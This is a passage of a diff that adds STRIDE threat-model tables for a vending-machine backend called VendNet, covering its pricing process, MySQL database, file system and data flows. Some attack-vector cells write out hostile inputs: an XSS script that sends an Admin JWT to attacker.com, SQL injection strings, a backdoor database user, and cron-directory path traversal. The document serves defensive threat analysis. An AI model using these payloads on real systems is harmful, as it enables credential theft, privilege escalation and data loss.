+| **R**epudiation | Yes | T-60 | **OS-level file operations not correlated to requesting Administrator in audit log**: Backup creation and log rotation events are written to the audit log as system events without including the `UserId` of the Administrator who triggered the on-demand operation, making post-incident attribution impossible. | After T-58 or T-59, security investigators review the audit log but find only the event type and timestamp, not the originating Admin account. | Malicious insider (Administrator) | Audit logging present; HTTP request context (JWT `sub`) to OS operation audit record correlation not confirmed | Medium |
+| **I**nformation Disclosure | Yes | T-61 | **Backup files world-readable due to permission misconfiguration, exposing AES-256-encrypted archives**: A deployment error sets `/var/vendnet/backups/` permissions wider than the documented `700`, allowing other OS users or processes on the same host to read encrypted backup archives; if the AES-256 key is co-located or weak, decryption is feasible. | OS-level attacker (via web shell or lateral movement on the server) reads files from `/var/vendnet/backups/`; proceeds to locate the encryption key or brute-force a weak key. | OS-level attacker / malicious insider | AES-256 encryption on backup files; `700` directory permissions documented; key management and storage location not documented | High |
+| **D**enial of Service | Yes | T-62 | **Disk exhaustion via silent backup rotation failure**: The 30-day rotation job fails silently (cron crash, permission error) causing nightly backups to accumulate indefinitely; a large MySQL dump (~1–5 GB) per day fills `/var/vendnet/` within weeks, causing all file writes (audit logs, reports, new backups) to fail with `IOException`. | Rotation cron job throws an uncaught exception and does not retry; disk fills; application catches `IOException` on audit log append and falls back silently, hiding the problem. | Infrastructure failure / misconfiguration | 30-day rotation policy documented; alerting on disk usage and rotation job health not documented | Medium |
+| **E**levation of Privilege | Yes | T-63 | **Application-to-OS privilege escalation via `ProcessBuilder` command injection**: Successful exploitation of T-59 grants arbitrary command execution as the application service account; if that account has `sudo` rights or the application runs as root (a common misconfiguration in containerised deployments), full OS control is achieved. | After injecting commands via T-59, attacker executes `sudo -l`, checks for SUID binaries, or writes to crontab; escalates from application service account to root. | Malicious insider (Administrator) / external attacker with Admin access | `ProcessBuilder` without shell interpreter; principle of least privilege for service account; explicit absence of `sudo` rights not confirmed | Critical |
+
+---
+
+#### P6 — Pricing & Configuration
+
+| STRIDE | Applicable? | Threat ID | Threat Description | Attack Vector | Threat Agent | Existing Controls | Severity |
+|--------|:-----------:|-----------|-------------------|---------------|-------------|-------------------|----------|
+| **S**poofing | Yes | T-64 | **Suspended Administrator's unexpired JWT continues to authorise pricing changes**: After an Administrator account is suspended (`AccountStatus.SUSPENDED`) following a security incident, their stateless JWT remains cryptographically valid until `exp`, allowing continued pricing and configuration changes. | Suspended Admin calls `PUT /products/{id}/price`; Spring Security validates the JWT signature but the filter does not re-query `AccountStatus` on each request. | Malicious insider (Administrator) | JWT `exp` claim; live `AccountStatus` check per request not documented | High |
+| **T**ampering | Yes | T-65 | **Rogue Administrator sets all product prices to zero across full catalog**: Compromised or malicious Administrator iterates all `productId` values from `GET /products` and calls `PUT /products/{id}/price` for each with `{"amount":0.00}`, violating the `Price.amount > 0` invariant and causing immediate financial loss. | Admin loops through all product UUIDs; submits price-zero update for each; vending machines receive the update via `DF8` and dispense products for free. | Malicious insider (Administrator) / compromised Admin account | Admin-only endpoint; `Price.amount > 0` domain invariant; audit logging | Critical |
+| **R**epudiation | Yes | T-66 | **Price change event not attributed to specific Administrator in audit log**: A pricing change is recorded in the audit log with the new price value and timestamp but without the `UserId` of the Administrator who submitted the change, preventing accountability after a manipulation incident. | Malicious Admin exploits the audit field gap to deny having changed prices; only the new value and time are logged, not the actor. | Malicious insider (Administrator) | Audit logging; JWT identity binding to request; per-field audit completeness not confirmed | Medium |
+| **I**nformation Disclosure | Yes | T-67 | **Configuration endpoint response reveals internal infrastructure details**: The configuration management API response body includes internal fields such as database connection strings, internal service URLs, environment variable names, or the JWT secret key name, providing an attacker with a blueprint for further attacks. | Admin calls `GET /admin/config`; response serialises full Spring `Environment` properties including `spring.datasource.url`, `spring.datasource.password` (if not masked), and internal IP addresses. | External attacker (via compromised Admin account) | HTTPS encryption; explicit response DTO field exclusion required; `@Value`-injected secrets must not be serialised | High |
+| **D**enial of Service | Yes | T-68 | **Rapid configuration update flood triggers high-frequency database writes and cache invalidations**: Attacker with a compromised Admin account submits sustained rapid `PUT /admin/config` requests, causing excessive database write contention and configuration cache invalidation that degrades system throughput for all users. | Compromised Admin JWT used to submit 500+ configuration update requests per second; each triggers a DB write plus downstream cache flush. | Compromised Admin account / automated attack | Admin authentication required; per-session request rate limiting not documented | Medium |
+| **E**levation of Privilege | Yes | T-69 | **Operator reaches pricing endpoint via overly permissive `@PreAuthorize`**: The `PUT /products/{id}/price` endpoint uses `hasAnyRole('OPERATOR','ADMINISTRATOR')` or lacks a role annotation entirely, allowing Operator-role users to modify product pricing that is intended to be Administrator-only. | Authenticated Operator calls `PUT /products/{id}/price`; annotation misconfiguration allows the request to pass the security check. | Malicious insider (Operator) | RBAC `@PreAuthorize(hasRole('ADMINISTRATOR'))`; annotation correctness must be verified in security configuration review | High |
+
+---
 
 ### 4.2.3 Data Stores
 
-#### Users DB
-<!-- TODO: Focus on Tampering, Information Disclosure, Denial of Service -->
+#### DS1 — MySQL Database
 
-#### Inventory DB
-<!-- TODO: Repeat -->
+| STRIDE | Applicable? | Threat ID | Threat Description | Attack Vector | Threat Agent | Existing Controls | Severity |
+|--------|:-----------:|-----------|-------------------|---------------|-------------|-------------------|----------|
+| **S**poofing | Yes | T-70 | **Direct database access using leaked application credentials**: The Spring Boot application's MySQL username and password (stored in environment variables) are exposed via a Git commit, verbose log output, or error response, allowing direct database connection that bypasses all application-layer security. | Attacker discovers credentials in a repository history or log aggregation system; connects directly to MySQL port using a standard client (e.g., `mysql -h db -u vendnet -p`). | External attacker / malicious insider | Credentials stored in environment variables (not source code); TB4 network isolation documented; direct external port exposure should be blocked by firewall | Critical |
+| **T**ampering | Yes | T-71 | **Direct SQL manipulation bypasses application audit and business-rule layer**: Attacker with direct database access (via T-70 or TB4 boundary failure) modifies sale records, user roles, or product prices via raw SQL, bypassing all domain invariants, application audit logging, and RBAC. | `UPDATE users SET role = 'ADMINISTRATOR' WHERE username = 'attacker';` executed directly via MySQL client; no application audit event triggered; domain invariants not enforced. | External attacker / malicious insider (DB access) | TB4 network isolation; application service account least-privilege not explicitly specified | Critical |
+| **T**ampering | Yes | T-72 | **SQL injection via application input modifies database records**: Unsanitised application input injected into a Hibernate native query allows an attacker to execute arbitrary DML (UPDATE, DELETE, INSERT) against any table accessible to the application DB account. | `POST /products` with `name=Juice'; UPDATE users SET role='ADMINISTRATOR' WHERE username='attacker'; --` ; native query path interpolates the value without binding. | External attacker | Spring Data JPA / Hibernate parameterised JPQL; native query paths require manual parameterisation | Critical |
+| **R**epudiation | Yes | T-73 | **No database-level audit trail for direct-access operations**: Changes made directly to MySQL (bypassing the application) are not recorded in the application audit log; the MySQL binary log is not explicitly documented as enabled, leaving no authoritative record of unauthorised direct-access modifications. | Insider with DB credentials alters sale totals or deletes audit records; application audit log shows no corresponding event. | Malicious insider (DB access) | Application-layer audit log; MySQL binary log / general query log enablement not documented | High |
+| **I**nformation Disclosure | Yes | T-74 | **Full table extraction via SQL injection UNION attack**: A UNION-based SQL injection in any vulnerable query endpoint allows extraction of the entire `users` table (including `passwordHash`, `email`) or `sales` table in a single request. | `GET /products?name=x' UNION SELECT username,passwordHash,email,NULL,NULL FROM users-- -` returns user credential data in the product listing JSON response. | External attacker | Hibernate parameterised queries; native query paths | Critical |
+| **I**nformation Disclosure | Yes | T-75 | **MySQL error messages in HTTP response expose schema structure**: Unhandled database exceptions propagate to the HTTP response body (Spring Boot default error handling), revealing table names, column names, SQL fragments, and query structure that assist further exploitation. | Attacker submits malformed input; Spring Boot returns 500 with stack trace containing `com.mysql.cj.jdbc.exceptions...` and the failing SQL statement including table/column names. | External attacker | Spring Boot `server.error.include-stacktrace=never`; explicit error mapping not confirmed in production config | Medium |
+| **D**enial of Service | Yes | T-76 | **Database connection pool exhaustion via time-delayed query injection**: Attacker injects a `SLEEP(30)` or heavy Cartesian-join query into a search parameter, holding database connections open for the sleep duration and exhausting HikariCP's connection pool. | Injects `' AND SLEEP(30)--` into a product-search query parameter; 20 concurrent requests each hold a connection for 30s; HikariCP pool exhausted; all DB operations block. | External attacker | Parameterised queries prevent injection on most paths; connection pool timeout and query timeout configuration not confirmed | High |
+| **E**levation of Privilege | Yes | T-77 | **Application DB account holds excessive privileges enabling DDL operations**: The Spring Boot application connects to MySQL with a user granted `ALL PRIVILEGES` (or `CREATE`, `DROP`, `ALTER`) rather than the minimum `SELECT`, `INSERT`, `UPDATE`, `DELETE` required, allowing schema manipulation via SQL injection or credential theft. | After T-72 or T-70, attacker issues `DROP TABLE users` or `CREATE USER 'backdoor'@'%' IDENTIFIED BY 'pass'`; succeeds because the application DB account holds DDL privileges. | External attacker / malicious insider | Principle of least privilege for DB account; explicit privilege grant level not documented | Critical |
 
-#### Sales DB
-<!-- TODO: Repeat -->
+---
 
-#### Telemetry DB
-<!-- TODO: Repeat -->
+#### DS2 — Server File System (`/var/vendnet/`)
 
-#### File System (OS)
-<!-- TODO: Repeat — critical for path traversal, unauthorized access -->
+| STRIDE | Applicable? | Threat ID | Threat Description | Attack Vector | Threat Agent | Existing Controls | Severity |
+|--------|:-----------:|-----------|-------------------|---------------|-------------|-------------------|----------|
+| **S**poofing | Yes | T-78 | **OS attacker reads backup archive by running as or impersonating the application service account**: An attacker who has gained an OS shell (e.g., via T-63 or a web shell) reads files in `/var/vendnet/backups/` by operating as the application service account, for which directory permissions are `700`. | Attacker with OS shell runs `cat /var/vendnet/backups/2026-04-10/vendnet_backup.sql.enc`; AES-256 encryption protects content if the key is stored separately and securely. | OS-level attacker | AES-256 encryption; `700` directory permissions; service account isolation; key storage location not documented | High |
+| **T**ampering | Yes | T-79 | **Audit log file tampered to erase evidence of security events**: Attacker with OS-level access modifies or truncates files in `/var/vendnet/logs/audit/` to remove log entries recording their prior malicious activity before detection. | Attacker truncates `audit_2026-04-10.log` or removes specific entries; `640` permissions limit this to the service account or root; HMAC checksums detect modification if verification is performed. | OS-level attacker / malicious insider | `640` log file permissions; HMAC checksums appended to each log entry; active HMAC verification schedule not documented | High |
+| **T**ampering | Yes | T-80 | **Symlink attack on report directory generation writes application data outside sandbox**: Attacker with OS access creates a symlink at an expected report path (e.g., `/var/vendnet/reports/sales/`) pointing to a sensitive OS directory; the application follows the symlink during `Files.createDirectories()` and writes report data into the symlink target. | Attacker creates `ln -s /etc /var/vendnet/reports/sales`; application calls `Files.createDirectories("/var/vendnet/reports/sales/2026/04/10/")`; writes report CSV into `/etc/2026/04/10/`. | OS-level attacker | Sandboxed path validation; `NOFOLLOW_LINKS` option in `Files.createDirectories()` call not confirmed | High |
+| **R**epudiation | Yes | T-81 | **File system operations not linked to the requesting user in the application audit log**: Backup writes, log rotations, and report directory creations appear in the audit log as system-generated events without the `UserId` of the Administrator who triggered them via the API, preventing post-incident attribution. | Security investigator reviews audit log after T-58/T-59; cannot identify which Admin account initiated the anomalous file operation. | Malicious insider (Administrator) | Audit logging present; HTTP request context (JWT `sub`) to file-operation audit record correlation not confirmed | Medium |
+| **I**nformation Disclosure | Yes | T-82 | **Report files containing customer PII served to non-Admin role via RBAC misconfiguration**: CSV/JSON report files under `/var/vendnet/reports/` contain customer purchase history and PII; a misconfigured file-serving endpoint or path-guessing allows access by Operator or unauthenticated callers. | Operator calls `GET /admin/reports/sales/2026/04/10/daily_sales_summary.csv` by constructing the URL from the documented directory pattern; if the endpoint lacks Admin-only role enforcement, the file is served. | Malicious insider (Operator) / external attacker | RBAC matrix specifies Admin-only report access; explicit endpoint-level role check for file serving not confirmed | High |
+| **D**enial of Service | Yes | T-83 | **Disk exhaustion from silent accumulation of reports and logs**: Log rotation (7/90-day) or backup rotation (30-day) jobs fail silently; accumulated files fill `/var/vendnet/`, causing Java NIO write failures on audit log appends, report generation, and backup writes, propagating as 500 errors. | Rotation cron job throws uncaught `IOException` and stops; disk fills over weeks; application encounters `ENOSPC` on next audit log write; unhandled exception disables all file operations. | Infrastructure failure / misconfiguration | Retention policies documented; alerting on disk usage and rotation job health not documented | Medium |
+| **E**levation of Privilege | Yes | T-84 | **Path traversal writes to privileged OS directory enabling persistence**: Exploiting T-58, an attacker constructs a path that resolves outside `/var/vendnet/` to a cron or init directory, then writes a cron entry or init script that executes on next system event, establishing OS-level persistence. | Via T-58, attacker causes `Files.createDirectories("../../../../etc/cron.d/")` then writes a cron schedule entry to `../../../../etc/cron.d/vendnet_persist` via a subsequent report write operation. | Malicious insider (Administrator) / external attacker with Admin access | Whitelist pattern; effective prevention requires path canonicalisation followed by prefix assertion against `/var/vendnet/` before any file operation | Critical |
+
+---
 
 ### 4.2.4 Data Flows
 
-<!-- TODO: For each data flow in Level 1 DFD, analyze STRIDE (focus on Tampering, Information Disclosure) -->
+The table below provides a cross-reference; detailed per-flow threat entries follow.
 
-| Data Flow | From → To | S | T | R | I | D | E | Key Threats |
-|-----------|-----------|---|---|---|---|---|---|-------------|
-| Credentials | Customer → P1 | <!-- TODO --> | | | | | | |
-| JWT Token | P1 → Customer | | | | | | | |
-| Purchase Request | Customer → P3 | | | | | | | |
-| Payment Request | P3 → PayGW | | | | | | | |
-| Telemetry Data | VM → P4 | | | | | | | |
-| Backup Files | P5 → FS | | | | | | | |
-| ... | | | | | | | | |
+| Data Flow | From → To | S | T | R | I | D | E | Key Threat IDs |
+|-----------|-----------|---|---|---|---|---|---|----------------|
+| DF1: Credentials & Requests | Customer → VendNet | T-85 | T-86 | — | T-87 | T-88 | — | Credential interception; request tampering; debug log exposure; thread-pool flood |
+| DF2: JWT & API Responses | VendNet → Customer | T-89 | T-90 | — | T-91 | T-92 | — | JWT in error response; TLS downgrade; cross-user data in response; unbounded payload |
+| DF3: Stock Updates | Operator → VendNet | — | T-93 | — | — | T-94 | — | Proxy-MITM tampering; Operator flood |
+| DF4: Stock Status & Logs | VendNet → Operator | — | — | — | T-95 | — | — | Security events exposed in log response |
+| DF5: Management Commands | Admin → VendNet | T-96 | T-97 | — | — | T-98 | — | XSS-based JWT theft; config tampering; admin flood |
+| DF6: Reports & Audit Logs | VendNet → Admin | — | T-99 | — | T-100 | — | — | Audit log tampered in transit; password hashes in user-list response |
+| DF7: Telemetry & Sales Events | Vending Machine → VendNet | T-101 | T-102 | — | — | T-103 | — | Stolen cert from cloud; falsified sales; coordinated fleet flood |
+| DF8: Config & Price Updates | VendNet → Vending Machine | — | T-104 | — | T-105 | — | — | Config tampered on non-mTLS legacy device; plaintext on device |
+| DF9: Payment Auth Requests | VendNet → Payment Gateway | — | T-106 | — | T-107 | — | — | Amount tampered via SSRF; transaction data in debug log |
+| DF10: Payment Confirmation | Payment Gateway → VendNet | T-108 | T-109 | — | — | — | — | Forged webhook; status modified FAILED→COMPLETED |
+| DF11: SQL Queries | VendNet → MySQL | — | T-110 | — | — | T-111 | — | Second-order SQL injection; N+1 connection exhaustion |
+| DF12: Query Results | MySQL → VendNet | — | — | — | T-112 | — | — | Over-broad result set exposes cross-user records |
+| DF13: Backup/Log/Report Writes | VendNet → File System | — | T-113 | — | — | T-114 | — | Path traversal on write; disk exhaustion from concurrent writes |
+| DF14: File Reads | File System → VendNet | — | T-115 | — | T-116 | — | — | Malicious planted file served as report; audit log read exposes full history |
+
+---
+
+#### DF1 — Customer → VendNet (Credentials, Purchase Requests, Catalog Queries)
+
+| STRIDE | Applicable? | Threat ID | Threat Description | Attack Vector | Threat Agent | Existing Controls | Severity |
+|--------|:-----------:|-----------|-------------------|---------------|-------------|-------------------|----------|
+| **S**poofing | Yes | T-85 | **Credential interception via TLS downgrade or SSL stripping**: If the server accepts TLS 1.0/1.1 connections or allows cipher suite downgrade, a network MITM strips TLS and captures credentials in plaintext. | Attacker on shared network performs SSL stripping or downgrade negotiation; captures `POST /auth/login` body including password. | External attacker (network-level) | HTTPS (TLS 1.2+ required per architecture); minimum TLS version configuration in Spring Boot not confirmed | Medium |
+| **T**ampering | Yes | T-86 | **HTTP parameter pollution injects duplicate fields to subvert price validation**: Attacker submits a purchase request with two occurrences of the `price` field (different values); if the JSON parser selects the last occurrence (attacker-controlled), server-side validation may check the first (legitimate) value while persisting the second. | `POST /sales` body: `{"productId":"x","price":1.50,"price":0.01}`; parser behaviour for duplicate keys is implementation-defined; Jackson by default uses last value. | Malicious customer | Jackson JSON parser (uses last duplicate value by default); explicit schema validation or schema-strict parsing | Low |
+| **I**nformation Disclosure | Yes | T-87 | **Credentials captured in application debug logs**: If `DEBUG` logging is enabled in production (or via Spring Actuator), the framework logs full request bodies including passwords to the application log files, making plaintext credentials accessible to anyone with log read access. | Spring Boot `logging.level.org.springframework.web=DEBUG` logs request body to `/var/vendnet/logs/app.log`; accessible to ops team or via log aggregation SIEM. | Malicious insider (ops team) | BCrypt protects stored passwords; sensitive-field masking in request logging not confirmed | Medium |
+| **D**enial of Service | Yes | T-88 | **Authenticated HTTP flood exhausts Spring Boot Tomcat thread pool**: Attacker with a valid Customer JWT sends thousands of concurrent catalog query or purchase requests, saturating the embedded Tomcat thread pool and rendering the API unavailable to all users. | Automated tool with valid JWT sends 10,000 concurrent `GET /products` requests; all threads blocked; legitimate requests queue and timeout (503). | External attacker | Authentication required (reduces anonymous attack surface); per-account rate limiting not documented | High |
+
+---
+
+#### DF2 — VendNet → Customer (JWT Token, Catalog Data, Purchase Confirmation)
+
+| STRIDE | Applicable? | Threat ID | Threat Description | Attack Vector | Threat Agent | Existing Controls | Severity |
+|--------|:-----------:|-----------|-------------------|---------------|-------------|-------------------|----------|
+| **S**poofing | Yes | T-89 | **JWT leaked in error response body or application access log**: A malformed request triggers a verbose error response that includes the JWT being validated; or the `Authorization` header is written to an access log file accessible to operations staff. | 400/500 error response includes `"token": "eyJ..."` in body; or Tomcat access log format includes `%{Authorization}i` header value. | External attacker / malicious insider | Spring Boot error handler; access log configuration; JWT must not appear in error responses or logs | Medium |
+| **T**ampering | Yes | T-90 | **API response body modified via TLS certificate mismatch on client side**: If the companion web or mobile client does not validate the VendNet server TLS certificate (no pinning, `trustAllCerts` enabled in client), a network MITM can intercept and modify API responses including purchase confirmations and product prices. | Attacker installs a rogue CA certificate on a compromised network; presents a self-signed certificate for the VendNet domain; unvalidating client accepts it; response data modified. | External attacker (network-level) | HTTPS with valid CA-signed certificate on server side; client-side certificate validation is outside backend control | Medium |
+| **I**nformation Disclosure | Yes | T-91 | **JPA query missing `userId` filter returns all customers' purchase records**: A Spring Data repository method for the purchase-history endpoint omits the `WHERE userId = :userId` clause, causing the response to include all customers' purchase data in the reply to a single user's query. | Customer calls `GET /customers/{id}/history`; backing repository method is `findAll()` without scoping predicate; all `Sale` records serialised into response. | Malicious customer (if exploitable by any authenticated caller) | Spring Data JPA repository method definitions; explicit `userId` predicate in all user-scoped queries | High |
+| **D**enial of Service | Yes | T-92 | **Unbounded response payload from unpaginated endpoint exhausts server heap**: `GET /products` or `GET /sales` returns all records with no pagination, generating a multi-megabyte JSON body that consumes Jackson serialisation memory and saturates network bandwidth. | Customer calls `GET /products` with no pagination parameters; 100,000 product records serialised to JSON; server heap exhausted during serialisation; OOM error. | External attacker / legitimate misuse | Pagination recommended; default and maximum page-size enforcement not documented | Medium |
+
+---
+
+#### DF3 — Operator → VendNet (Stock Updates, Machine Log Requests, Issue Reports)
+
+| STRIDE | Applicable? | Threat ID | Threat Description | Attack Vector | Threat Agent | Existing Controls | Severity |
+|--------|:-----------:|-----------|-------------------|---------------|-------------|-------------------|----------|
+| **T**ampering | Yes | T-93 | **Stock update payload tampered by corporate or attacker-controlled MITM proxy**: Operator's HTTP client routes through a proxy (corporate gateway or VPN exit node); attacker controlling the proxy modifies the `currentQuantity` field before the request reaches VendNet. | Attacker controls proxy between Operator and VendNet; intercepts `PUT /machines/{id}/slots/{n}/stock`; replaces `{"currentQuantity":50}` with `{"currentQuantity":0}`. | External attacker (network-level MITM) | HTTPS end-to-end encryption; TLS certificate validation on Operator client; proxy TLS interception would require a trusted CA installation | Medium |
+| **D**enial of Service | Yes | T-94 | **Operator endpoint flood via compromised Operator session causes DB write contention**: Attacker with a stolen Operator JWT submits high-frequency stock update requests, creating database write contention on the Inventory DB and degrading inventory management performance for all legitimate Operators. | Automated tool with Operator JWT sends 500 `PUT /machines/{id}/stock` per second; DB write queue saturates; Operator dashboard response times degrade. | External attacker (with stolen Operator JWT) | Authentication required; per-user rate limiting not documented | Medium |
+
+---
+
+#### DF4 — VendNet → Operator (Stock Status, Machine Logs, Issue Acknowledgements)
+
+| STRIDE | Applicable? | Threat ID | Threat Description | Attack Vector | Threat Agent | Existing Controls | Severity |
+|--------|:-----------:|-----------|-------------------|---------------|-------------|-------------------|----------|
+| **I**nformation Disclosure | Yes | T-95 | **Machine log response includes security audit events not intended for Operator role**: The machine log retrieval endpoint returns raw audit log entries (failed logins, Admin configuration changes, security events) mixed with operational machine logs, exposing security-sensitive information to Operators. | Operator calls `GET /machines/{id}/logs`; response includes system-wide audit events that the RBAC permission matrix restricts to Administrator; Operator gains visibility into Admin activity and ongoing security incidents. | Malicious insider (Operator) | RBAC restricts audit log access to Admin; log endpoint content filtering by role not documented | Medium |
+
+---
+
+#### DF5 — Administrator → VendNet (Management Commands, Config Changes, Report Requests)
+
+| STRIDE | Applicable? | Threat ID | Threat Description | Attack Vector | Threat Agent | Existing Controls | Severity |
+|--------|:-----------:|-----------|-------------------|---------------|-------------|-------------------|----------|
+| **S**poofing | Yes | T-96 | **Admin JWT exfiltrated via XSS in companion web administration interface**: If a web-based Admin UI exists and is vulnerable to stored or reflected XSS, an attacker injects a script that reads the JWT from `localStorage` or `sessionStorage` and exfiltrates it to an attacker-controlled server. | Attacker submits a product name containing `<script>fetch('https://attacker.com/?t='+localStorage.getItem('jwt'))</script>`; Administrator views the product management page; script executes and sends the Admin JWT. | External attacker | HTTPS; Content Security Policy (CSP) not documented; JWT storage location in client not documented | High |
+| **T**ampering | Yes | T-97 | **Admin configuration request body modified in transit via TLS misconfiguration**: If the Admin management client does not strictly validate the VendNet server certificate, a network MITM can modify a configuration update payload (e.g., setting `auth.lockout.enabled = false`) before it reaches the API. | MITM intercepts `PUT /admin/config` through a compromised CA or TLS downgrade; modifies payload to disable a security control. | External attacker (network-level MITM) | HTTPS; server TLS certificate validity; Admin client strict certificate validation required | Medium |
+| **D**enial of Service | Yes | T-98 | **Admin endpoint flooded via compromised Admin session degrading management operations**: Attacker holding a compromised Admin JWT submits a sustained flood of management requests, causing DB write contention and making legitimate administrative operations (user management, pricing, backups) unresponsive. | Compromised Admin JWT used to send 1,000 `PUT /admin/users/{id}` per second; DB write saturation degrades all Admin operations. | External attacker (with compromised Admin JWT) | Admin authentication required; per-session rate limiting not documented | Medium |
+
+---
+
+#### DF6 — VendNet → Administrator (Reports, System Status, User Lists, Audit Logs)
+
+| STRIDE | Applicable? | Threat ID | Threat Description | Attack Vector | Threat Agent | Existing Controls | Severity |
+|--------|:-----------:|-----------|-------------------|---------------|-------------|-------------------|----------|
+| **T**ampering | Yes | T-99 | **Audit log API response modified in transit to conceal attacker activity**: A network MITM intercepts the `GET /logs/audit` response and removes or modifies log entries corresponding to the attacker's prior activity, causing the Administrator to review a sanitised log that misses the incident. | TLS compromise or downgrade on the Admin client network segment allows active response modification. | External attacker (network-level MITM) | HTTPS; HMAC checksums on stored log files (detect file-level tampering); response-level integrity not separately guaranteed | Medium |
+| **I**nformation Disclosure | Yes | T-100 | **`GET /admin/users` response serialises `passwordHash` field to JSON**: A missing `@JsonIgnore` annotation on the `passwordHash` field (or absent DTO exclusion) causes the user list API response to include BCrypt hashes for all users, enabling offline cracking attempts even though plaintext passwords are never stored. | Admin calls `GET /admin/users`; JSON response array includes `"passwordHash":"$2a$12$..."` for each user; attacker with Admin access (or who intercepts the response) extracts the hashes. | Malicious insider (Administrator) / external attacker with Admin access | BCrypt hashing (protects plaintext); DTO serialisation must explicitly exclude `passwordHash`; `@JsonIgnore` or dedicated response DTO not confirmed | High |
+
+---
+
+#### DF7 — Vending Machine → VendNet (Telemetry Data, Sales Events, Stock Levels)
+
+| STRIDE | Applicable? | Threat ID | Threat Description | Attack Vector | Threat Agent | Existing Controls | Severity |
+|--------|:-----------:|-----------|-------------------|---------------|-------------|-------------------|----------|
+| **S**poofing | Yes | T-101 | **Stolen mTLS certificate used from attacker cloud infrastructure to submit events at scale**: Attacker extracts the mTLS client certificate and private key from a physically or logically compromised machine and connects to `EP2` from a remote server, submitting falsified sales events for any `machineId` in the fleet. | Cloud server connects to `EP2` using stolen cert/key; submits 1,000 high-value fake sale events for multiple machine IDs; all are authenticated and accepted. | Physical attacker / supply-chain attacker | mTLS certificate-based authentication; certificate revocation (CRL/OCSP) publication and checking not documented | High |
+| **T**ampering | Yes | T-102 | **Compromised machine firmware sends false sales events inflating revenue or depleting virtual stock**: Compromised firmware generates sale records for products not dispensed or with inflated `quantity` values, creating false revenue and causing virtual stock depletion without physical movement. | Firmware submits `{"machineId":"...","productId":"...","quantity":10,"unitPrice":2.00}` for an actual single-item dispense; mTLS authenticates the source but cannot verify data accuracy. | Compromised firmware / supply-chain attacker | mTLS source authentication; cross-validation of sale quantity against slot capacity not documented | High |
+| **D**enial of Service | Yes | T-103 | **Coordinated telemetry flood from multiple compromised machines overwhelms backend**: A fleet of compromised VMs (each with valid mTLS certs) simultaneously floods `EP2`, saturating backend processing threads and the telemetry database write capacity, causing legitimate sales and inventory requests to timeout. | 50 compromised VMs each send 200 telemetry requests/second; 10,000 total req/s saturates Tomcat thread pool; sales processing (`P3`) queues and customers experience failures. | Compromised VM fleet | mTLS authentication limits to known machines; per-machine request rate limiting not documented | High |
+
+---
+
+#### DF8 — VendNet → Vending Machine (Configuration Updates, Price Changes)
+
+| STRIDE | Applicable? | Threat ID | Threat Description | Attack Vector | Threat Agent | Existing Controls | Severity |
+|--------|:-----------:|-----------|-------------------|---------------|-------------|-------------------|----------|
+| **T**ampering | Yes | T-104 | **Configuration push tampered on a legacy machine that does not enforce mTLS**: If any machine in the fleet runs firmware that accepts configuration over standard HTTPS without client certificate verification, a network MITM on the machine's local segment can intercept and modify the price list or slot assignments. | Attacker performs ARP spoofing on the machine's network segment; intercepts configuration response; replaces product prices with zeroed values or substitutes slot assignments. | External attacker (network-level MITM) | mTLS required per architecture; absence of legacy-device exceptions not confirmed | High |
+| **I**nformation Disclosure | Yes | T-105 | **Full product price list and slot configuration stored in plaintext on compromised machine**: The configuration payload pushed to the VM (containing the full product catalog, prices, and slot mappings) is stored locally on the device in plaintext; physical access to the machine hardware allows reading business-sensitive pricing strategy. | Attacker gains physical access to a machine; reads flash storage or local configuration file; obtains complete pricing and slot assignment data. | Physical attacker | mTLS encrypts data in transit; security of configuration storage on VM device is outside backend scope | Medium |
+
+---
+
+#### DF9 — VendNet → Payment Gateway (Payment Authorization Requests)
+
+| STRIDE | Applicable? | Threat ID | Threat Description | Attack Vector | Threat Agent | Existing Controls | Severity |
+|--------|:-----------:|-----------|-------------------|---------------|-------------|-------------------|----------|
+| **T**ampering | Yes | T-106 | **Payment amount tampered in outbound authorisation request via SSRF**: An SSRF vulnerability in a separate VendNet endpoint allows an attacker to cause the server to issue a crafted payment authorisation request with a modified `amount` field to the Payment Gateway, resulting in a confirmed payment at a lower value. | Attacker exploits SSRF on a VendNet endpoint to make the backend send a `POST` to the Payment Gateway with `{"amount":0.01}` instead of the actual `amount:2.50`; Gateway approves; product dispensed. | External attacker | HTTPS with TLS certificate verification to Gateway; outbound SSRF protection not documented | High |
+| **I**nformation Disclosure | Yes | T-107 | **Payment authorisation request body captured in DEBUG-level application log**: With `DEBUG` logging active in production, the complete outbound payment authorisation request (amount, currency, tokenised card reference, merchant transaction ID) is written to the application log file. | Spring Boot logs outbound `RestTemplate` or `WebClient` request body at DEBUG; log file or SIEM captures payment transaction metadata including tokenised card references. | Malicious insider (ops team) | No raw card data in request (tokenised only per `XP2`); DEBUG logging in production not confirmed absent | Medium |
+
+---
+
+#### DF10 — Payment Gateway → VendNet (Payment Confirmation / Rejection)
+
+| STRIDE | Applicable? | Threat ID | Threat Description | Attack Vector | Threat Agent | Existing Controls | Severity |
+|--------|:-----------:|-----------|-------------------|---------------|-------------|-------------------|----------|
+| **S**poofing | Yes | T-108 | **Forged payment confirmation webhook bypasses HMAC validation**: Attacker sends a fabricated `POST` to callback endpoint `EP3` with `"status":"COMPLETED"` and a crafted HMAC using a leaked or brute-forced secret key, causing VendNet to process a fake payment as successful and dispense product. | Attacker recovers the HMAC key (from a source-code leak, Git history, or brute force of a short key); computes valid HMAC over a crafted payload; submits to `EP3`. | External attacker | HMAC signature validation on EP3; HMAC key strength, storage, and rotation not documented | Critical |
+| **T**ampering | Yes | T-109 | **Payment status field modified FAILED→COMPLETED in callback payload**: Network MITM intercepts the Gateway's confirmation webhook and changes `"paymentStatus":"FAILED"` to `"paymentStatus":"COMPLETED"` before VendNet processes it; HMAC validation must cover the full payload body to detect this. | TLS compromise enables active interception of `DF10`; payload field modified; if HMAC does not bind the full payload or is absent on this field, the tampered status is accepted. | External attacker (network-level MITM) | HTTPS; HMAC signature validation; full payload coverage of HMAC (including status field) not confirmed | High |
+
+---
+
+#### DF11 — VendNet → MySQL Database (SQL Queries)
+
+| STRIDE | Applicable? | Threat ID | Threat Description | Attack Vector | Threat Agent | Existing Controls | Severity |
+|--------|:-----------:|-----------|-------------------|---------------|-------------|-------------------|----------|
